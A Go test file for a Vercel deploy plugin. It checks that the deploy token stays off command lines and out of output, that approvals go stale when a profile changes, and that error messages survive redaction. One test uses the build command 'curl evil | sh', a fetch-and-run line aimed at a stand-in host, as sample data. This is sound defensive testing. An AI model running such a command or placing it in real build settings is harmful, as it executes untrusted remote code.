package vercelplugin

import (
	"context"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"regexp"
	"strings"
	"testing"

	cerbplugin "github.com/hollis-labs/cerberus/pkg/plugin"
	"github.com/hollis-labs/plugin-sdk/subprocess"
)

const sentinelToken = "tok-SENTINEL-4f2a9c" //nolint:gosec // a test sentinel, not a credential

// fakeCLI writes an executable `vercel` that records its arguments and
// whether it saw VERCEL_TOKEN, and puts its directory first on PATH, so the
// shell-run deploy command finds it too.
func fakeCLI(t *testing.T) (path, log string) {
	t.Helper()
	dir := t.TempDir()
	log = filepath.Join(dir, "calls.log")
	path = filepath.Join(dir, "vercel")
	script := "#!/bin/sh\n" +
		`printf '%s token=%s\n' "$*" "${VERCEL_TOKEN:+set}" >> '` + log + "'\n" +
		`case "$1" in link) mkdir -p .vercel && echo '{}' > .vercel/project.json ;; esac` + "\n" +
		`echo "Inspect: https://vercel.com/acme/site/abc123 [2s]"` + "\n" +
		`echo "Production: https://site-7h2w.vercel.app [2s]"` + "\n"
	if err := os.WriteFile(path, []byte(script), 0o755); err != nil { //nolint:gosec // an executable test fixture
		t.Fatal(err)
	}
	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))
	return path, log
}

// gitRepo is a committed git checkout, linked to Vercel when linked is true.
func gitRepo(t *testing.T, linked bool) string {
	t.Helper()
	repo := t.TempDir()
	for _, args := range [][]string{
		{"init", "-q", "-b", "main"},
		{"-c", "user.email=t@example.com", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "init"},
	} {
		cmd := exec.Command("git", append([]string{"-C", repo}, args...)...)
		cmd.Env = cleanGitEnv(os.Environ())
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
	}
	if linked {
		if err := os.MkdirAll(filepath.Join(repo, ".vercel"), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(repo, ".vercel", "project.json"), []byte(`{}`), 0o600); err != nil {
			t.Fatal(err)
		}
		// .vercel is what `vercel link` writes and is conventionally ignored.
		if err := os.WriteFile(filepath.Join(repo, ".git", "info", "exclude"), []byte(".vercel\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return repo
}

// cleanGitEnv drops every GIT_ variable, so a test run from a git hook does
// not commit into the hook's repository.
func cleanGitEnv(env []string) []string {
	var out []string
	for _, e := range env {
		if !strings.HasPrefix(e, "GIT_") {
			out = append(out, e)
		}
	}
	return out
}

// scratchCache points the user cache directory at a scratch one, so the
// CLI's isolated config is created there, and returns that config's path.
func scratchCache(t *testing.T) string {
	t.Helper()
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("XDG_CACHE_HOME", filepath.Join(home, ".cache"))
	dir, err := isolatedGlobalConfig()
	if err != nil {
		t.Fatal(err)
	}
	return dir
}

func writeProfiles(t *testing.T, profiles string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "profiles.yaml")
	if err := os.WriteFile(path, []byte(profiles), 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}

func loaded(t *testing.T, config map[string]string) *Plugin {
	t.Helper()
	p := New()
	if _, err := p.Init(context.Background(), subprocess.InitParams{Config: config}); err != nil {
		t.Fatal(err)
	}
	if _, err := p.Load(context.Background()); err != nil {
		t.Fatal(err)
	}
	return p
}

func callTool(p *Plugin, op string, args map[string]any) (subprocess.MCPCallResult, error) {
	return p.MCPCallTool(context.Background(), subprocess.MCPCallRequest{ToolName: cerbplugin.ToolNameForOperation(ConnectorID, op), Arguments: args})
}

func decode[T any](t *testing.T, result subprocess.MCPCallResult, err error) T {
	t.Helper()
	if err != nil {
		t.Fatalf("call: %v", err)
	}
	if result.IsError {
		t.Fatalf("call failed: %s", result.Content)
	}
	body, _ := cerbplugin.SplitTelemetry(result.Content)
	var out T
	if err := json.Unmarshal(body, &out); err != nil {
		t.Fatalf("decode %s: %v", result.Content, err)
	}
	return out
}

func callAs[T any](t *testing.T, p *Plugin, op string, args map[string]any) T {
	t.Helper()
	result, err := callTool(p, op, args)
	return decode[T](t, result, err)
}

// failureText is the message of a coded refusal or a plain error.
func failureText(t *testing.T, result subprocess.MCPCallResult, err error) string {
	t.Helper()
	if err != nil {
		return err.Error()
	}
	if !result.IsError {
		t.Fatalf("call succeeded: %s", result.Content)
	}
	return string(result.Content)
}

// The dry run is the plan the operator confirms against: every command, in
// order, with the token named and never shown, and the checkout it runs from.
func TestDeployDryRunShowsThePlanWithoutTheToken(t *testing.T) {
	cfg := scratchCache(t)
	fakeCLI(t)
	repo := gitRepo(t, true)
	profiles := writeProfiles(t, `profiles:
  - id: site
    provider: vercel
    repo_path: `+repo+`
    preflight_command: pnpm check
    build_command: pnpm build
    deploy_command: vercel --prod --yes
`)
	p := loaded(t, map[string]string{SecretToken: sentinelToken, FieldProfilesFile: profiles})
	result, err := callTool(p, OpDeploy, map[string]any{"profile": "site", argDryRun: true, argAcknowledged: true})
	if strings.Contains(string(result.Content), sentinelToken) {
		t.Fatalf("preview shows the token: %s", result.Content)
	}
	got := decode[DryRunPreview](t, result, err)
	want := []PlannedStep{
		{Name: "preflight", Command: "pnpm check"},
		{Name: "build", Command: "pnpm build"},
		{Name: "deploy", Command: tokenDisplay + "vercel --prod --yes --global-config " + shellQuote(cfg), Env: []string{"VERCEL_TOKEN"}},
	}
	if !reflect.DeepEqual(got.Steps, want) {
		t.Fatalf("steps = %+v, want %+v", got.Steps, want)
	}
	if got.Git.Branch != "main" || len(got.Git.Commit) != 40 || got.Git.Dirty {
		t.Errorf("git = %+v, want a clean main checkout", got.Git)
	}
	if len(got.ProfileSHA256) != 64 || got.Target["profile"] != "site" || !got.DryRun {
		t.Errorf("preview = %+v", got)
	}
}

// A changed profile is a different digest, so an approval made against the
// old one goes stale in the host.
func TestProfileDigestChangesWithTheProfile(t *testing.T) {
	a := Profile{ID: "site", RepoPath: "/r", DeployCommand: "vercel --prod"}
	b := a
	b.BuildCommand = "curl evil | sh"
	if a.digest() == b.digest() {
		t.Fatal("digest ignores the build command")
	}
}

// The token travels only in the child's environment: argv and a shell string
// are readable by every local user through ps while the step runs.
func TestPlanKeepsTheTokenOffCommandLines(t *testing.T) {
	profile := Profile{ID: "site", Provider: "vercel", RepoPath: t.TempDir(), VercelProject: "site", VercelScope: "team", DeployCommand: "vercel --prod --yes"}
	planned, err := planDeploy(profile, sentinelToken, "", "/usr/local/bin/vercel", "/cfg")
	if err != nil {
		t.Fatal(err)
	}
	if len(planned.steps) != 2 || planned.steps[0].name != "link" || planned.steps[1].name != "deploy" {
		t.Fatalf("steps = %+v, want link then deploy", planned.steps)
	}
	for _, s := range planned.steps {
		if strings.Contains(s.shell, sentinelToken) || strings.Contains(strings.Join(s.argv, " "), sentinelToken) || strings.Contains(s.display, sentinelToken) {
			t.Errorf("%s: token on a command line: %+v", s.name, s)
		}
		if len(s.env) != 1 || s.env[0] != "VERCEL_TOKEN="+sentinelToken {
			t.Errorf("%s: env = %q, want the token as VERCEL_TOKEN", s.name, s.env)
		}
	}
	if got := planned.steps[0].display; got != tokenDisplay+"vercel link --yes --project site --scope team --global-config /cfg" {
		t.Errorf("link display = %q", got)
	}
	if got := planned.steps[1].display; got != tokenDisplay+"vercel --prod --yes --scope 'team' --global-config '/cfg'" {
		t.Errorf("deploy display = %q", got)
	}
}

// The token is required. Without one, status and deploy (its dry run too)
// fail as credential_missing with the command that stores one, and the CLI
// never runs: it would otherwise use whatever `vercel login` session the
// account holds, outside the declared-secret channel.
func TestNoTokenIsCredentialMissing(t *testing.T) {
	_, log := fakeCLI(t)
	scratchCache(t)
	profiles := writeProfiles(t, "profiles:\n  - id: site\n    repo_path: "+gitRepo(t, true)+"\n")
	p := loaded(t, map[string]string{FieldProfilesFile: profiles})
	for name, args := range map[string]map[string]any{
		"status":  nil,
		"dry run": {"profile": "site", argDryRun: true, argAcknowledged: true},
		"run":     {"profile": "site", argAcknowledged: true},
	} {
		op := OpDeploy
		if name == "status" {
			op = OpStatus
		}
		result, err := callTool(p, op, args)
		message := failureText(t, result, err)
		if !strings.Contains(message, string(cerbplugin.ErrorCredentialMissing)) || !strings.Contains(message, "cerberus secrets set vercel/token") {
			t.Errorf("%s: %s, want credential_missing naming cerberus secrets set vercel/token", name, message)
		}
		assertSurvivesRedaction(t, name, message)
	}
	if _, err := planDeploy(Profile{ID: "site", RepoPath: t.TempDir()}, "", "", "/bin/vercel", "/cfg"); err == nil {
		t.Error("a plan was made without a token")
	}
	if calls, _ := os.ReadFile(log); len(calls) != 0 { //nolint:gosec // the test's own file
		t.Errorf("the CLI ran without a token: %s", calls)
	}
	if health, _ := p.Health(context.Background()); health.OK {
		t.Errorf("health = %+v, want not OK without a token", health)
	}
}

// A profile's own scope wins; the scope secret is the default.
func TestScopeDefaultsToTheSecret(t *testing.T) {
	repo := gitRepo(t, true)
	own, _ := planDeploy(Profile{ID: "a", RepoPath: repo, VercelScope: "mine"}, sentinelToken, "team", "", "/cfg")
	fallback, _ := planDeploy(Profile{ID: "b", RepoPath: repo}, sentinelToken, "team", "", "/cfg")
	if !strings.Contains(own.steps[0].shell, "--scope 'mine'") || !strings.Contains(fallback.steps[0].shell, "--scope 'team'") {
		t.Fatalf("own %q fallback %q", own.steps[0].shell, fallback.steps[0].shell)
	}
}

// A run links an unlinked repo, deploys with the real token in the child's
// environment, records the displayed commands and finds the production URL.
func TestDeployRunsTheProfile(t *testing.T) {
	cfg := scratchCache(t)
	_, log := fakeCLI(t)
	repo := gitRepo(t, false)
	profiles := writeProfiles(t, `profiles:
  - id: site
    repo_path: `+repo+`
    vercel_project: site
    build_command: printf built
`)
	p := loaded(t, map[string]string{SecretToken: sentinelToken, FieldProfilesFile: profiles})
	result, err := callTool(p, OpDeploy, map[string]any{"profile": "site", argAcknowledged: true})
	got := decode[RunResult](t, result, err)
	if !got.Success || len(got.Steps) != 3 {
		t.Fatalf("run = %+v", got)
	}
	names := []string{got.Steps[0].Name, got.Steps[1].Name, got.Steps[2].Name}
	if !reflect.DeepEqual(names, []string{"build", "link", "deploy"}) {
		t.Fatalf("steps = %v", names)
	}
	if got.Steps[0].Output != "built" {
		t.Errorf("build output = %q", got.Steps[0].Output)
	}
	if got.Steps[2].Command != tokenDisplay+"vercel --prod --yes --global-config "+shellQuote(cfg) {
		t.Errorf("recorded deploy command %q", got.Steps[2].Command)
	}
	if got.DeploymentURL != "https://site-7h2w.vercel.app" {
		t.Errorf("deployment url = %q", got.DeploymentURL)
	}
	calls, _ := os.ReadFile(log) //nolint:gosec // the test's own file
	want := "link --yes --project site --global-config " + cfg + " token=set\n--prod --yes --global-config " + cfg + " token=set\n"
	if string(calls) != want {
		t.Errorf("the CLI saw %q, want %q", calls, want)
	}
}

// A step that echoes the token does not carry it into the result: the plugin
// removes the value it holds, whoever printed it.
func TestRunOutputNeverShowsTheToken(t *testing.T) {
	scratchCache(t)
	repo := gitRepo(t, true)
	profiles := writeProfiles(t, `profiles:
  - id: site
    repo_path: `+repo+`
    deploy_command: printf 'Error! token %s is not valid\n' "$VERCEL_TOKEN"; exit 1
`)
	p := loaded(t, map[string]string{SecretToken: sentinelToken, FieldProfilesFile: profiles})
	result, err := callTool(p, OpDeploy, map[string]any{"profile": "site", argAcknowledged: true})
	if strings.Contains(string(result.Content), sentinelToken) {
		t.Fatalf("result carries the token: %s", result.Content)
	}
	got := decode[RunResult](t, result, err)
	if got.Success || got.Error == "" || !strings.Contains(got.Steps[0].Output, redactedMarker) {
		t.Fatalf("run = %+v; want a failed deploy whose output shows the marker", got)
	}
}

// The first failing step stops the run.
func TestRunStopsAtTheFirstFailure(t *testing.T) {
	scratchCache(t)
	repo := gitRepo(t, true)
	profiles := writeProfiles(t, `profiles:
  - id: site
    repo_path: `+repo+`
    preflight_command: exit 3
    deploy_command: touch deployed
`)
	p := loaded(t, map[string]string{SecretToken: sentinelToken, FieldProfilesFile: profiles})
	got := callAs[RunResult](t, p, OpDeploy, map[string]any{"profile": "site", argAcknowledged: true})
	if got.Success || len(got.Steps) != 1 || got.Steps[0].Name != "preflight" {
		t.Fatalf("run = %+v", got)
	}
	if _, err := os.Stat(filepath.Join(repo, "deployed")); err == nil {
		t.Fatal("the deploy step ran after preflight failed")
	}
}

// Long output keeps its tail, where the error and the URL are.
func TestLongOutputKeepsItsTail(t *testing.T) {
	out, truncated := tail(strings.Repeat("x", maxStepOutput)+"END", maxStepOutput)
	if !truncated || !strings.HasSuffix(out, "END") || len(out) != maxStepOutput {
		t.Fatalf("tail len %d truncated %v", len(out), truncated)
	}
}

// Every refusal is coded invalid_args, names what to fix, and reaches the
// operator intact through the host's redaction.
func TestRefusals(t *testing.T) {
	scratchCache(t)
	repo := gitRepo(t, false)
	profiles := writeProfiles(t, "profiles:\n  - id: site\n    repo_path: "+repo+"\n  - id: other\n    provider: netlify\n    repo_path: "+repo+"\n")
	p := loaded(t, map[string]string{SecretToken: sentinelToken, FieldProfilesFile: profiles})
	p.findCLI = func() string { return "" }
	unconfigured := loaded(t, nil)
	cases := []struct {
		name   string
		plugin *Plugin
		op     string
		args   map[string]any
		want   string
	}{
		{"unacknowledged", p, OpDeploy, map[string]any{"profile": "site"}, "requires acknowledgment"},
		{"no profile arg", p, OpDeploy, map[string]any{argAcknowledged: true}, "profile is required"},
		{"unknown profile", p, OpDeploy, map[string]any{"profile": "nope", argAcknowledged: true}, "no profile"},
		{"other provider", p, OpDeploy, map[string]any{"profile": "other", argAcknowledged: true}, "deploys only to vercel"},
		{"unlinked without project", p, OpDeploy, map[string]any{"profile": "site", argDryRun: true}, "needs vercel_project"},
		{"no profiles file", unconfigured, OpListProfiles, nil, "no profiles file is configured"},
		{"read dry run", p, OpStatus, map[string]any{argDryRun: true}, "read-only"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			result, err := callTool(tc.plugin, tc.op, tc.args)
			if err != nil {
				t.Fatalf("uncoded error %v", err)
			}
			message := failureText(t, result, err)
			if !strings.Contains(message, tc.want) || !strings.Contains(message, string(cerbplugin.ErrorInvalidArgs)) {
				t.Fatalf("refusal = %s, want %q coded invalid_args", message, tc.want)
			}
			assertSurvivesRedaction(t, tc.name, message)
		})
	}
	assertSurvivesRedaction(t, "no cli", errNoVercelCLI.Error())
}

// The link step needs the CLI resolved up front, so it can run it by path.
func TestMissingCLIRefusesALink(t *testing.T) {
	_, err := planDeploy(Profile{ID: "site", RepoPath: t.TempDir(), VercelProject: "site"}, sentinelToken, "", "", "/cfg")
	if err == nil || err.Error() != errNoVercelCLI.Error() {
		t.Fatalf("err = %v", err)
	}
}

// status and list_profiles read the file on every call and name what is
// configured, never a value.
func TestStatusAndListProfiles(t *testing.T) {
	cli, _ := fakeCLI(t)
	linked := gitRepo(t, true)
	// The shape Cerberus's own infra.yaml used reads unchanged, extra keys
	// and all.
	profiles := writeProfiles(t, `version: 1
providers:
  vercel: {}
profiles:
  - id: site
    name: Site
    provider: vercel
    repo_path: `+linked+`
    vercel_project: site
    cloudflare_zone_id: z1
    env: prod
`)
	p := loaded(t, map[string]string{SecretToken: sentinelToken, SecretScope: "team", FieldProfilesFile: profiles})
	status := callAs[Status](t, p, OpStatus, nil)
	want := Status{VercelCLI: cli, TokenConfigured: true, ScopeConfigured: true, ProfilesFile: profiles, Profiles: 1, ProfilesFileRead: true, Problems: []string{}}
	if !reflect.DeepEqual(status, want) {
		t.Fatalf("status = %+v, want %+v", status, want)
	}
	list := callAs[[]ProfileSummary](t, p, OpListProfiles, nil)
	if len(list) != 1 || list[0] != (ProfileSummary{ID: "site", Name: "Site", RepoPath: linked, VercelProject: "site", Linked: true}) {
		t.Fatalf("list = %+v", list)
	}
	health, _ := p.Health(context.Background())
	if !health.OK {
		t.Fatalf("health = %+v", health)
	}
}

func TestProfilesFileProblems(t *testing.T) {
	cases := map[string]string{
		"duplicate id": "profiles:\n  - id: a\n  - id: a\n",
		"missing id":   "profiles:\n  - repo_path: /x\n",
		"not yaml":     "profiles: [\n",
	}
	for name, content := range cases {
		if _, err := loadProfiles(writeProfiles(t, content)); err == nil {
			t.Errorf("%s: loaded", name)
		}
	}
	if _, err := loadProfiles(filepath.Join(t.TempDir(), "absent.yaml")); err == nil {
		t.Error("absent file loaded")
	}
}

func TestExpandHome(t *testing.T) {
	home, _ := os.UserHomeDir()
	if got := expandHome("~/p.yaml"); got != filepath.Join(home, "p.yaml") {
		t.Errorf("expandHome = %q", got)
	}
	if got := expandHome("/abs/p.yaml"); got != "/abs/p.yaml" {
		t.Errorf("expandHome = %q", got)
	}
}

func TestExtractDeploymentURL(t *testing.T) {
	cases := map[string]struct{ output, want string }{
		"production first": {"Vercel CLI 50.28.0\nInspect: https://vercel.com/acme/site/abc [2s]\nProduction: https://site-7h2w.vercel.app [2s]\nQueued\n", "https://site-7h2w.vercel.app"},
		"skips dashboard":  {"Inspect: https://vercel.com/acme/site/abc [2s]\nhttps://example.dev\n", "https://example.dev"},
		"ansi":             {"\x1b[90mProduction:\x1b[0m https://site.vercel.app \x1b[2m[2s]\x1b[0m", "https://site.vercel.app"},
		"dashboard only":   {"Inspect: https://vercel.com/acme/site/abc [2s]\n", "https://vercel.com/acme/site/abc"},
	}
	for name, tc := range cases {
		if got := extractDeploymentURL(tc.output); got != tc.want {
			t.Errorf("%s: got %q, want %q", name, got, tc.want)
		}
	}
}

// AGENTS.md in the Cerberus repo: a recovery instruction must survive
// redact.Text intact. A plugin cannot import internal/redact, so these mirror
// the host's rules (internal/redact/redact.go at v0.4.0-beta.2), as the forge
// plugin's do. A floor, not a proof.
var redactionHazards = []struct {
	name    string
	pattern *regexp.Regexp
}{
	{"bearer", regexp.MustCompile(`(?i)\bbearer[ \t]+\S+`)},
	{"host assignment", regexp.MustCompile(`(?i)(["']?[a-z0-9_.-]*(?:api[_-]?key|token|secret|password|passwd|passcode|private[_-]?key|credentials?|authorization|cookie)[a-z0-9_.-]*["']?\s*(?:=>|=|:)\s*)("[^"\n]*"|'[^'\n]*'|[^\s,;&<>]+)`)},
	{"host flag", regexp.MustCompile(`(?i)((?:^|[\s"'` + "`" + `([{])--?[a-z0-9_-]*(?:api[_-]?key|token|secret|password|passwd|private[_-]?key|credentials?)[a-z0-9_-]*(?:=|[ \t]+))("[^"\n]*"|'[^'\n]*'|[^\s,;<>]+)`)},
}

func assertSurvivesRedaction(t *testing.T, label, text string) {
	t.Helper()
	for _, hazard := range redactionHazards {
		if match := hazard.pattern.FindString(text); match != "" {
			t.Errorf("%s contains a %s-shaped construct %q, which the host redactor rewrites\n  full text: %s", label, hazard.name, strings.TrimSpace(match), text)
		}
	}
}

// The displayed token placeholder is what the plan shows the operator, so it
// has to survive the host's rules too: "--token [vercel token]" did not.
func TestTokenPlaceholderSurvivesRedaction(t *testing.T) {
	profile := Profile{ID: "site", RepoPath: t.TempDir(), VercelProject: "site"}
	planned, err := planDeploy(profile, sentinelToken, "", "/bin/vercel", "/Users/me/Library/Caches/cerberus-vercel-plugin/cli-config")
	if err != nil {
		t.Fatal(err)
	}
	for _, s := range planned.planned() {
		assertSurvivesRedaction(t, s.Name, s.Command)
	}
}
